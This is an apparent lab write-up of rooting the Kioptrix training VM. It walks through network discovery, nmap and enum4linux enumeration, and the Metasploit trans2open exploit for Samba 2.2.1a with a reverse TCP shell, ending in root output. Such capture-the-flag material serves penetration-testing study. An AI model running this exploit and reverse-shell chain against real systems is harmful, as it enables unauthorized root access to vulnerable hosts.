# Kioptrix Smaba exploit write-up

Kioptrix is Virtual Machine with many exploits and now we are going to exploit it's one of exploit - Samba.



 > The target of this lab is use vulnerablitity in Samba service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.58.0/16   |   Screen View: Unique Hosts                                                        
                                                                                                                            
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                            
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.42.219  00:0c:29:cd:26:47      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.219 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
.
.
.
.
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP) 
.
.
```
We see that Samba is open, now we need to look for it's version number, so that we can exploit the vulnerablity of that version. For this we'll use `enum4linux` tool, and we got:

```
.
.
.
Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
.
.
.
```

Search for samba 2.2.1a exploits and found `CVE:
2003-0201
` exploit.


## 3- Exploiting

To use that CVE, we need to search on metasploit.
`sudo msfdb init && msfconsole`

```
                                                    ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .

```

We use option #1 because it's for linux.

`msf6 > use 1`

`msf6 exploit(linux/samba/trans2open) > show options`


```
Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/
                                      using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.43.203   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce
   ```

Remote host is not set, we use command `set RHOST 192.168.42.219` so that is now set.


There is alot of options to use from payload when command run `show payloads`, and we use 34th.

```
.
.
.
 34  payload/linux/x86/shell_reverse_tcp               .                normal  No     Linux Command Shell, Reverse TCP Inline
 .
 .
 .
```



Now with all set, we run Final command to get into VM.

`msf6 exploit(linux/samba/trans2open) > exploit`


And that's it.

```
msf6 exploit(linux/samba/trans2open) > exploit

[*] Started reverse TCP handler on 192.168.43.203:4444 
[*] 192.168.43.219:139 - Trying return address 0xbffffdfc...
[*] 192.168.43.219:139 - Trying return address 0xbffffcfc...
[*] 192.168.43.219:139 - Trying return address 0xbffffbfc...
[*] 192.168.43.219:139 - Trying return address 0xbffffafc...
[*] 192.168.43.219:139 - Trying return address 0xbffff9fc...
[*] 192.168.43.219:139 - Trying return address 0xbffff8fc...
[*] 192.168.43.219:139 - Trying return address 0xbffff7fc...
[*] 192.168.43.219:139 - Trying return address 0xbffff6fc...
[*] Command shell session 9 opened (192.168.43.203:4444 -> 192.168.43.219:1033) at 2024-06-27 01:56:01 -0400
[*] Command shell session 10 opened (192.168.43.203:4444 -> 192.168.43.219:1034) at 2024-06-27 01:56:01 -0400

[*] Command shell session 12 opened (192.168.43.203:4444 -> 192.168.43.219:1036) at 2024-06-27 01:56:07 -0400
id
uid=0(root) gid=0(root) groups=99(nobody)
[*] Command shell session 11 opened (192.168.43.203:4444 -> 192.168.43.219:1035) at 2024-06-27 01:56:21 -0400
whoami
root

```

We are ROOT now.